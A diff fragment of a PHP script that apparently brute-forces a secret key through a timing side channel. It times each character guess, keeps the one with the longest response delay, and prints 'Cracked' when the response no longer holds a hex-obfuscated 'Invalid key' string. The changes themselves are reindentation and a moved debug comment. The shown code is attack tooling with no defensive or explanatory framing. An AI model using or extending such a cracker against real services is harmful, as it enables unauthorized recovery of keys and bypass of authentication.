@@ -35,6 +35,7 @@ $charset  = range(65,122);
 				$morrey = ($status);
 				
 					if(!@eregi("\x49\x6e\x76\x61\x6c\x69\x64\x20\x6b\x65\x79",$resultat)){
+					
 						echo "\r\nCracked : ".$tmp."\n";
 						exit(-1);
 					}
@@ -42,13 +43,12 @@ $charset  = range(65,122);
 				echo "\r Trying : ".$final.$char." => [".$morrey."]";
 				$all[$char]=$morrey; //save all in array
 		}
-
-$cracked=array_search(max($all), $all); // $key = 2; compare max value
-$final .=$cracked;// save max delai in one table
-
-// echo  $final."\n"; #Disable debugging
-
- unset($all);
+		$cracked=array_search(max($all), $all); // $key = 2; compare max value
+		$final .=$cracked;// save max delai in one table
+		
+		 #Disable debugging
+		 //echo  $final."\n";
+	unset($all);
 }
 
 
